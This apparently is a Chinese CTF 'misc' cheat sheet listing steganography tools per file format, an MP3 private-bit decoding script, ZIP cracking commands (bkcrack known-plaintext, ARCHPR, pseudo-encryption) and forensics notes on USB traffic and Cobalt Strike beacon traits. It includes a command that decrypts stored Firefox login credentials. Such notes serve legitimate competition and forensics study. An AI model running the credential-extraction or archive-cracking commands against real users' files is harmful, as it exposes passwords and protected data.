| <font style="color:rgb(51, 51, 51);">jpg</font> | <font style="color:rgb(51, 51, 51);">stegdetect</font> | <font style="color:rgb(51, 51, 51);">隐写检测</font> |
| | <font style="color:rgb(51, 51, 51);">WaterMarkH</font> | <font style="color:rgb(51, 51, 51);">盲水印</font> |
| | <font style="color:rgb(51, 51, 51);">BlindWatermark</font> | <font style="color:rgb(51, 51, 51);">盲水印</font> |
| | <font style="color:rgb(51, 51, 51);">Stegsolve</font> | <font style="color:rgb(51, 51, 51);">lsb隐写</font> |
| | <font style="color:rgb(51, 51, 51);">cloacked-pixel-master</font> | <font style="color:rgb(51, 51, 51);">lsb隐写 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">Jstego</font> | <font style="color:rgb(51, 51, 51);">无密码</font> |
| | <font style="color:rgb(51, 51, 51);">DeEgger Embedder</font> | <font style="color:rgb(51, 51, 51);">无密码</font> |
| | <font style="color:rgb(51, 51, 51);">JPHS</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">Free File Camouflage</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">F5-steganography</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">outguess</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">Pixeljihad</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">SilentEye</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">Steghide（如果密码被识别成参数，打双引号！）</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">stegpy</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |


### <font style="color:rgb(51, 51, 51);">图片类型：PNG</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">png</font> | <font style="color:rgb(51, 51, 51);">Pngcheck</font> | <font style="color:rgb(51, 51, 51);">图片结构</font> |
| | <font style="color:rgb(51, 51, 51);">tewakpng</font> | <font style="color:rgb(51, 51, 51);">图片结构</font> |
| <font style="color:rgb(51, 51, 51);">PIL Image 库生成图片，修补图片缺失块，例如 PLETE 块（注意大小之类必须相同，根据PNG模块的 PNG 色彩模式 选择 RGB RGBA 之类的模式生成相同size图片）</font> | <font style="color:rgb(51, 51, 51);">PIL Image库</font> | <font style="color:rgb(51, 51, 51);">图片结构</font> |
| <font style="color:rgb(51, 51, 51);">gaps 图片拼接（需要输入一整张完整图）</font> | <font style="color:rgb(51, 51, 51);">gaps run ./flag.png newfalg.png --generations=48 --population=20 --size=100</font> | <font style="color:rgb(51, 51, 51);">图片拼接</font> |
| | <font style="color:rgb(51, 51, 51);">png crc</font> | <font style="color:rgb(51, 51, 51);">crc 宽高爆破爆破原理：通过修改宽高并对png块的有效内容进行crc32计算爆破，例如：一个块包含uint32length / union CTYPE type / struct PNG_CHUNK_IHDR / uint32 crcuint32是块信息，其余内容为块内容</font> |
| | <font style="color:rgb(51, 51, 51);">PngIDAT</font> | <font style="color:rgb(51, 51, 51);">IDAT解压缩 / IDAT zlib解压缩</font> |
| | <font style="color:rgb(51, 51, 51);">WaterMarkH</font> | <font style="color:rgb(51, 51, 51);">盲水印</font> |
| | <font style="color:rgb(51, 51, 51);">BlindWatermark</font> | <font style="color:rgb(51, 51, 51);">盲水印</font> |
| | <font style="color:rgb(51, 51, 51);">Stegsolve</font> | <font style="color:rgb(51, 51, 51);">lsb隐写</font> |
| | <font style="color:rgb(51, 51, 51);">cloacked-pixel-master</font> | <font style="color:rgb(51, 51, 51);">lsb隐写 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">DeEgger Embedder</font> | <font style="color:rgb(51, 51, 51);">无密码</font> |
| | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">Pixeljihad</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">Silent Eye</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">sregpy</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">wbStego4.3open</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |


### <font style="color:rgb(51, 51, 51);">图片类型：APNG</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">apng</font> | <font style="color:rgb(51, 51, 51);">APNG Disassembler</font> | <font style="color:rgb(51, 51, 51);">帧数间隔隐写</font> |
| | <font style="color:rgb(51, 51, 51);">cloacked-pixel-master</font> | <font style="color:rgb(51, 51, 51);">lsb隐写 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">Pixeljihad</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |


### <font style="color:rgb(51, 51, 51);">图片类型：BMP</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">bmp</font> | <font style="color:rgb(51, 51, 51);">bmp宽高爆破原理</font> | <font style="color:rgb(51, 51, 51);">pixelsize = (bfsize - bfoffbitsize // channel)</font> |
| | <font style="color:rgb(51, 51, 51);">Stegsolve</font> | <font style="color:rgb(51, 51, 51);">lsb隐写</font> |
| | <font style="color:rgb(51, 51, 51);">cloacked-pixel-master</font> | <font style="color:rgb(51, 51, 51);">lsb隐写 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">WaterMarkH</font> | <font style="color:rgb(51, 51, 51);">盲水印</font> |
| | <font style="color:rgb(51, 51, 51);">S-Tools</font> | <font style="color:rgb(51, 51, 51);">有密码</font> |
| | <font style="color:rgb(51, 51, 51);">Pixeljihad</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">SilentEye</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">Steghide</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">stegpy</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">wbStego4.3open</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |


### <font style="color:rgb(51, 51, 51);">图片类型：BPG</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">bpg</font> | <font style="color:rgb(51, 51, 51);">BPGview</font> | <font style="color:rgb(51, 51, 51);">BPG查看</font> |
| | <font style="color:rgb(51, 51, 51);">cloacked-pixel-master</font> | <font style="color:rgb(51, 51, 51);">lsb隐写 / 无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |


### <font style="color:rgb(51, 51, 51);">图片类型：TIFF</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">tiff</font> | <font style="color:rgb(51, 51, 51);">cloacked-pixel-master</font> | <font style="color:rgb(51, 51, 51);">lsb隐写 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">SilentEye</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">Steghide</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |


### <font style="color:rgb(51, 51, 51);">图片类型：GIF</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">gif</font> | <font style="color:rgb(51, 51, 51);">identify</font> | <font style="color:rgb(51, 51, 51);">帧数间隔提取</font> |
| | <font style="color:rgb(51, 51, 51);">UUtool</font> | <font style="color:rgb(51, 51, 51);">gif拆分</font> |
| | <font style="color:rgb(51, 51, 51);">Stegsolve</font> | <font style="color:rgb(51, 51, 51);">lsb隐写</font> |
| | <font style="color:rgb(51, 51, 51);">cloacked-pixel-master</font> | <font style="color:rgb(51, 51, 51);">lsb隐写 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">WaterMarkH</font> | <font style="color:rgb(51, 51, 51);">盲水印</font> |
| | <font style="color:rgb(51, 51, 51);">S-Tools</font> | <font style="color:rgb(51, 51, 51);">有密码</font> |
| | <font style="color:rgb(51, 51, 51);">stegpy</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |


### <font style="color:rgb(51, 51, 51);">图片类型：其它</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型，有无密码）</font>** |
| :--- | --- | :--- |
| <font style="color:rgb(51, 51, 51);">WEBP</font> | <font style="color:rgb(51, 51, 51);">浏览器打开</font> | <font style="color:rgb(51, 51, 51);"></font> |
| | stegpy | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| <font style="color:rgb(51, 51, 51);">PNM</font> | <font style="color:rgb(51, 51, 51);">outguess</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |




---

## <font style="color:rgb(51, 51, 51);">音频题总结</font>
### <font style="color:rgb(51, 51, 51);">音频分析工具</font>
| **<font style="color:rgb(51, 51, 51);">工具 / 命令名称（隐写工具）</font>** | **<font style="color:rgb(51, 51, 51);">用途</font>** | **<font style="color:rgb(51, 51, 51);">命令 / 示例</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">010Editor</font> | | |
| <font style="color:rgb(51, 51, 51);">kinovea</font> | <font style="color:rgb(51, 51, 51);">逐秒分析</font> | |
| <font style="color:rgb(51, 51, 51);">VLC</font> | <font style="color:rgb(51, 51, 51);">逐秒分析</font> | |
| <font style="color:rgb(51, 51, 51);">Adobe Audition</font> | <font style="color:rgb(51, 51, 51);">DIFF隐写音频对比wave库音频双通道对比</font> | |
| <font style="color:rgb(51, 51, 51);">Audacity</font> | <font style="color:rgb(51, 51, 51);">频谱解密 波形分析</font> | |
| <font style="color:rgb(51, 51, 51);">multimon-ng</font> | <font style="color:rgb(51, 51, 51);">电音频分析（类似无线电频）</font> | |
| <font style="color:rgb(51, 51, 51);">MMSSTV</font> | <font style="color:rgb(51, 51, 51);">无线电音频分析</font> | |
| <font style="color:rgb(51, 51, 51);">QSSTV</font> | | |
| <font style="color:rgb(51, 51, 51);">DTMF 拨号隐写</font> | <font style="color:rgb(51, 51, 51);">拨号隐写</font> | <font style="color:rgb(51, 51, 51);">dtmf2num.exe 输入文件</font><br/><font style="color:rgb(51, 51, 51);">dtmf2num.exe inputfile</font> |
| <font style="color:rgb(51, 51, 51);">工具 / 命令名称（隐写工具）</font> | <font style="color:rgb(51, 51, 51);">用途</font> | <font style="color:rgb(51, 51, 51);">命令 / 示例</font> |
| <font style="color:rgb(51, 51, 51);">010Editor</font> | | |


### <font style="color:rgb(51, 51, 51);">音频隐写工具</font>
| **<font style="color:rgb(51, 51, 51);">工具 / 命令名称（隐写工具）</font>** | **<font style="color:rgb(51, 51, 51);">命令 / 示例</font>** | **<font style="color:rgb(51, 51, 51);">参数（常用）</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">SilentEye</font> | | |
| <font style="color:rgb(51, 51, 51);">DeepSound</font> | <font style="color:rgb(51, 51, 51);">爆破：</font><br/><font style="color:rgb(51, 51, 51);">python DeepsoundHash.py</font> | |
| <font style="color:rgb(51, 51, 51);">MP3Stego</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">encode.exe -E 隐藏文件 -P 密码 输入文件</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密：</font><br/><font style="color:rgb(51, 51, 51);">Decode.exe -X 输入文件 -P密码</font> | <font style="color:rgb(51, 51, 51);">-E 隐写文件-X 解密文件-P 密码</font> |
| <font style="color:rgb(51, 51, 51);">steghide</font> | <font style="color:rgb(51, 51, 51);">加密：</font><br/><font style="color:rgb(51, 51, 51);">steghide embed -cf 输入文件 -ef 隐藏文件 -p 密码</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">解密：</font><br/><font style="color:rgb(51, 51, 51);">steghide extract -sf 输入文件 -p </font><br/><font style="color:rgb(51, 51, 51);">密码爆破：python steghide</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">爆破脚本</font><br/><font style="color:rgb(51, 51, 51);">stegseek 隐写图片 爆破字典</font> | <font style="color:rgb(51, 51, 51);">-cf 输入文件-sf 输入文件-p 密码</font> |


### <font style="color:rgb(51, 51, 51);">音频类：MP3</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型 / 有无密码）</font>** |
| --- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">MP3</font> | <font style="color:rgb(51, 51, 51);">DeEggerEmbedder</font> | <font style="color:rgb(51, 51, 51);">无密码</font> |
| | <font style="color:rgb(51, 51, 51);">DeepSound</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">MP3Stego</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| <font style="color:rgb(77, 77, 77);">private位隐写</font> | | |


### MP3Private位隐写脚本
```python
# mp3 private 位隐写
f = open('题目-我爱你中国.mp3','rb').read()
flag = ''
i = 0
while i < len(f):
    i += 1
    if (f[i:i + 2] == b'\xFF\xFB' and f[i + 2] > 143):
        tmp = bin(int(f[i+2]))[2:].zfill(8)
        i += 0x1a0
        if(str(tmp[7]) == '1'):
            flag += '1'
        else:
            flag += '0'
# print(flag)
# str1 = ''
# for i in range(0, len(flag), 8):
#     tmp = flag[i:i + 8]
#     str1 += chr(int(tmp, 2))
# print(str1)

from PIL import Image
w,h = 389,26
img = Image.new("RGB",(w,h),(255,255,255))
for i in range(h):
    for j in range(w):
        if(flag[i*w+j] == '0'):
            img.putpixel((j,i),(255,255,255))
        else:
            img.putpixel((j,i),(0,0,0))
img.show()

```

### <font style="color:rgb(51, 51, 51);">音频类型：WAV</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型 / 有无密码）</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">WAV</font> | <font style="color:rgb(51, 51, 51);">S-Tools</font> | <font style="color:rgb(51, 51, 51);">有密码</font> |
| | <font style="color:rgb(51, 51, 51);">SilentEye</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">DeepSound</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">MP3Stego</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">Steghide</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| | <font style="color:rgb(51, 51, 51);">stegpy</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |


### <font style="color:rgb(51, 51, 51);">音频类型：AVI</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型 / 有无密码）</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">AVI</font> | <font style="color:rgb(51, 51, 51);">DeEggerEmbedder</font> | <font style="color:rgb(51, 51, 51);">无密码</font> |
| | <font style="color:rgb(51, 51, 51);">OurSecret</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |


### <font style="color:rgb(51, 51, 51);">音频类型：其它</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写工具</font>** | **<font style="color:rgb(51, 51, 51);">说明（隐写类型 / 有无密码）</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">AU</font> | <font style="color:rgb(51, 51, 51);">steghide</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| <font style="color:rgb(51, 51, 51);">FLAC</font> | <font style="color:rgb(51, 51, 51);">Deepsound</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |
| <font style="color:rgb(51, 51, 51);">APE</font> | <font style="color:rgb(51, 51, 51);">Deepsound</font> | <font style="color:rgb(51, 51, 51);">无密码 / 有密码</font> |




---

## <font style="color:rgb(51, 51, 51);">压缩包题总结</font>
### 脑洞
压缩包如果偏移什么都对的上，且不是异或，则试试将该段数据逆序

文件末尾有信息，可能是真信息

### <font style="color:rgb(51, 51, 51);">文件修复</font>
<font style="color:rgb(51, 51, 51);">压缩包修复 winrar--> tools --> repair archive</font>

### <font style="color:rgb(51, 51, 51);">伪加密</font>
<font style="color:rgb(51, 51, 51);">伪加密 ZipCenop</font>

<font style="color:rgb(51, 51, 51);">解密：java -jar ZipCenOp.jar r 压缩包.zip</font>

<font style="color:rgb(51, 51, 51);">伪加密 010Editor/Winhex</font>

| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">文件16进制数据</font>** |
| :--- | :--- |
| <font style="color:rgb(51, 51, 51);">ZIP</font> | <font style="color:rgb(51, 51, 51);">数据区：50 4B 03 04 00 00 [00 00]目录区：50 4B 01 02 00 00 00 00 [00 00]都为 [00] 表示无加密</font> |
| <font style="color:rgb(51, 51, 51);">RAR</font> | <font style="color:rgb(51, 51, 51);">52 61 72 21 1A 07 01 00 33 92 B5 E5 0A 01 05 0600 05 01 01 80 80 00 [0] 表示无加密 [4] 表示加密</font> |
| <font style="color:rgb(51, 51, 51);">文件类型</font> | <font style="color:rgb(51, 51, 51);">文件16进制数据</font> |


### <font style="color:rgb(51, 51, 51);">crc碰撞</font>
<font style="color:rgb(51, 51, 51);">碰撞原理：对内容进行爆破并crc32计算（整数型）</font>

<font style="color:rgb(51, 51, 51);">python crc32.py reverse 0xCRC密文</font>

<font style="color:rgb(51, 51, 51);">zip-crc-tools-main</font>

<font style="color:rgb(51, 51, 51);">python main.py -h</font>

<font style="color:rgb(51, 51, 51);">ZipCRCAnlyse</font>

<font style="color:rgb(51, 51, 51);">python ZipCRCAnlyse.py-h</font>

### <font style="color:rgb(51, 51, 51);">ARCHPR 暴力破解</font>
| **<font style="color:rgb(51, 51, 51);">攻击类型</font>** | **<font style="color:rgb(51, 51, 51);">说明</font>** |
| :--- | :--- |
| <font style="color:rgb(51, 51, 51);">暴力</font> | <font style="color:rgb(51, 51, 51);">要是发现爆不出，可能字符集错了！</font> |
| <font style="color:rgb(51, 51, 51);">掩码</font> | <font style="color:rgb(51, 51, 51);">abcd????ijkl 使用?代替未知字符</font> |
| <font style="color:rgb(51, 51, 51);">字典</font> | |
| <font style="color:rgb(51, 51, 51);">明文</font> | <font style="color:rgb(51, 51, 51);">压缩包的加密方式，加密软件，CRC值相同爆破一段时间即可停止，无需爆破至结束爆破出密钥，直接保存即可解压出压缩包</font> |
| <font style="color:rgb(51, 51, 51);">担保WinZip 恢复</font> | |
| <font style="color:rgb(51, 51, 51);">口令来自密钥</font> | |


### <font style="color:rgb(51, 51, 51);">bkbrack明文参数</font>
<font style="color:rgb(51, 51, 51);">( 可搭配archpr的明文爆破使用，并不需要完全破解，输入密钥即可）</font>

```plain
搭配指令：echo -n "16进制明文"|xxd -r -ps > 输出文件
-n 不换行输出
xxd 用二进制或者16进制显示内容
-r 把现实的十六进制转换为二进制内容
-p 以16进制转储输出
-s 偏移值

爆破参数：
-C 加密压缩包
-c 提取密文的部分
-p 提取铭文的部分
-x 压缩包内加密文件的偏移值 部分已知明文
-o 明文文件在压缩包内加密文件的偏移值
-time 显示时间
-k 密钥
-d 输出文件

爆破指令：
常规爆破指令：bkcrack -C一级文件 -c二级文件 -p明文文件（根据16进制构造头文件）
稀疏明文爆破指令： bkcrack -C 上级文件 -c 下级文件 -p 明文文件 -x 已知的连续明文 -x 已知的连续明文 -o 偏移量
绕过8字节检测：bkcrack -C 上级文件 -c 下级文件 -p 明文文件-o 30 -x 0 504b0304
解密指令：bkcrack -C上级文件 -c 下级文件 -p 明文文件 -d 解密文件
解密指令：bkcrack -C上级文件 -c 下级文件 -k 密钥 密钥 密钥 -d 解密文件
解压指令：python tools/inflate.py < 解密文件 > 解压文件 (如果使用了压缩文件压缩，则可以使用该命令解压)
新加密指令：bkcrack -C上级文件 -c 下级文件 -k 密钥 密钥 密钥 -U 解锁新文件 新密码
指定长度恢复密码:bkcrack -k 密钥 密钥 密钥 -r 长度 ?p（最小长度n..最大长度n）
```

### <font style="color:rgb(51, 51, 51);">NTFS流文件隐写</font>
<font style="color:rgb(51, 51, 51);">NtfsStreamsEditor2 360压缩查看提取</font>



---

## <font style="color:rgb(51, 51, 51);">OFFICE && 文档题总结</font>
| **<font style="color:rgb(51, 51, 51);">文件类型</font>** | **<font style="color:rgb(51, 51, 51);">隐写方式</font>** |
| :--- | :--- |
| <font style="color:rgb(51, 51, 51);">txt</font> | <font style="color:rgb(51, 51, 51);">零宽隐写（可隐写文件） stegsnow whitespcae wbStego4.3open需要密码/无需密码</font> |
| <font style="color:rgb(51, 51, 51);">doc，xlsx</font> | <font style="color:rgb(51, 51, 51);">转成zip查看文件结构，文字行距，隐藏字体</font> |
| <font style="color:rgb(51, 51, 51);">pdf</font> | <font style="color:rgb(51, 51, 51);">wbStego4.3open隐写 需要密码/无需密码</font> |
| <font style="color:rgb(51, 51, 51);">office文件</font> | <font style="color:rgb(51, 51, 51);">ctrl+A，修改文字颜色以及字体</font> |
| <font style="color:rgb(51, 51, 51);">AOPR office文档爆破</font> | |
| <font style="color:rgb(51, 51, 51);">oletool olevba</font> | <font style="color:rgb(51, 51, 51);">文档宏功能</font> |


### SNOW隐写参数
```plain
snow	snow.exe 参数 输入文件路径

snow.exe -C example -p "password" output	-C 压缩
-Q 静音
-S 报告文本近似空间量
-p 密码
-l 隐写空格时，生成比此短的值
-f 隐写空格时，隐写入此文件
-m 隐写空格时，隐写入此文件内容
```

---

## <font style="color:rgb(51, 51, 51);">取证题总结</font>
### <font style="color:rgb(51, 51, 51);">流量分析</font>
| **<font style="color:rgb(51, 51, 51);">工具/命令</font>** | **<font style="color:rgb(51, 51, 51);">用途</font>** | **<font style="color:rgb(51, 51, 51);">命令 / 示例</font>** |
| :--- | :--- | :--- |
| <font style="color:rgb(51, 51, 51);">binwalk / foremost</font> | <font style="color:rgb(51, 51, 51);">分离文件</font> | <font style="color:rgb(51, 51, 51);">foremost 参数 输入文件</font><br/><font style="color:rgb(51, 51, 51);">foremost -i inputfile -T</font> |
| <font style="color:rgb(51, 51, 51);">strings</font> | <font style="color:rgb(51, 51, 51);">查找指定字节流</font> | <font style="color:rgb(51, 51, 51);">strings 参数 输入文件</font><br/><font style="color:rgb(51, 51, 51);">strings inputfile</font> |
| <font style="color:rgb(51, 51, 51);">D_safe D盾</font> | <font style="color:rgb(51, 51, 51);">查找后门</font> | |
| <font style="color:rgb(51, 51, 51);">火狐登录凭证</font> | <font style="color:rgb(51, 51, 51);">火狐登录凭证分析</font> | <font style="color:rgb(51, 51, 51);">python firepwd.py 输入文件</font><br/><font style="color:rgb(51, 51, 51);">python firepwd.py logins.json</font> |
| <font style="color:rgb(51, 51, 51);">bmc</font> | <font style="color:rgb(51, 51, 51);">bmc文件取证</font> | <font style="color:rgb(51, 51, 51);">python bmc-tools-master.py -s bmcfile -d output</font> |
| <font style="color:rgb(51, 51, 51);">tcpxtract</font> | <font style="color:rgb(51, 51, 51);">分离文件</font> | <font style="color:rgb(51, 51, 51);">tcpxtract -f pcap 输入文件的路径tcpxtract -f pcap inputfile</font> |
| <font style="color:rgb(51, 51, 51);">UsbKeyboardDataJack</font> | <font style="color:rgb(51, 51, 51);">USB键盘流量分析</font> | <font style="color:rgb(51, 51, 51);">python UsbKeyboardDataJack.py 输入文件的</font><br/><font style="color:rgb(51, 51, 51);">UsbKeyboardDataJack.py inputfile</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">原理分析：xx00xx001000000第一字节代表特殊按键，如02代表shift键第三字节代表按键，如ABCDEFG</font> |
| <font style="color:rgb(51, 51, 51);">UsbMiceDataHacker</font> | <font style="color:rgb(51, 51, 51);">USB鼠标流量分析</font> | <font style="color:rgb(51, 51, 51);">python UsbMiceDataHacker.py 输入文件 输出文件 参数</font><br/><font style="color:rgb(51, 51, 51);">UsbMiceDataHacker.py inputfile outfile</font><br/><font style="color:rgb(51, 51, 51);"></font><br/><font style="color:rgb(51, 51, 51);">原理分析：00：01：02：000000020001000000 变种：</font>[0:2](https://www.yuque.com/ihk_1/ctf/edzum6nxo7q595m2#)<br/>[8:10](https://www.yuque.com/ihk_1/ctf/edzum6nxo7q595m2#)<br/><font style="color:rgb(51, 51, 51);">第一字节代表 按键 1左键 2右键 0 无第二字节代表x坐标，如果10进制>127，则减去256第二字节代表y坐标，如果10进制>127，则减去256（y轴转化为坐标需要变成-y）第四字节代表扩充字节 0代表没滚轮滚动，1代表向上滚动，FF代表向下滚动，2代表水平滚动右键一次，FE代表水平左键一次补充：请先让posx,posy进行运算，再进行判断按左键运算，避免移动式如果没按左键，位移没变</font> |
| <font style="color:rgb(51, 51, 51);">Usb数位板流量分析</font> | <font style="color:rgb(51, 51, 51);">Usb数位板流量分析</font> | <font style="color:rgb(51, 51, 51);">python usb数位板流量分析 原理分析：aaaaxxxx00yyyy0000 其中aaaa为过滤流量，转换10进制后xx+xx</font>_<font style="color:rgb(51, 51, 51);">256为x坐标，yy+yy</font>_<font style="color:rgb(51, 51, 51);">256为yy坐标</font> |
| <font style="color:rgb(51, 51, 51);">tshark</font> | <font style="color:rgb(51, 51, 51);">分析文件信息</font> | <font style="color:rgb(51, 51, 51);">tshark -r(选定流量文件/接口) -T fields -e 提取的内容 "其他参数" tshark -r inputfile -T fields -e usbhid.data "ip.src==192.168.0.1"</font> |
| <font style="color:rgb(51, 51, 51);">wireshark</font> | <font style="color:rgb(51, 51, 51);">流量分析</font> | |


### <font style="color:rgb(51, 51, 51);">流量分析命令</font>
#### <font style="color:rgb(51, 51, 51);">tshark以及其参数</font>
```plain
tshark 
-r "" //-r 后加入导入的流量包
-e "" //-e 后加分析字段 ，类似 http tcp
-Y "" // -Y 后加入过滤参数
-T "" //-T 后设置解析结果，例如：text ps json csv fields
> "" //> 后设置重定向输出
```

#### <font style="color:rgb(51, 51, 51);">多种shell流量分析</font>
##### <font style="color:rgb(51, 51, 51);">CodelStrike流量-beacon模式</font>
###### <font style="color:rgb(119, 119, 119);">特征</font>
<font style="color:rgb(51, 51, 51);">https-beacon通信中，cs默认使用空证书建立加密通道，流量中可以看见这一过程。</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694520633454-1040500b-1465-424b-9269-105eeace5567.png)

<font style="color:rgb(51, 51, 51);">同时在 https 协议的 Client Hello 和 Server Hello 阶段，都包含了 JA3S 值传输过程过程中会有 ja3，这个值在系统上是固定的，win10是一种的 但win11是另一种 他们取决于操作系统</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694520677063-ff71aac6-455c-4f12-9eb2-74f101ce82f9.png)

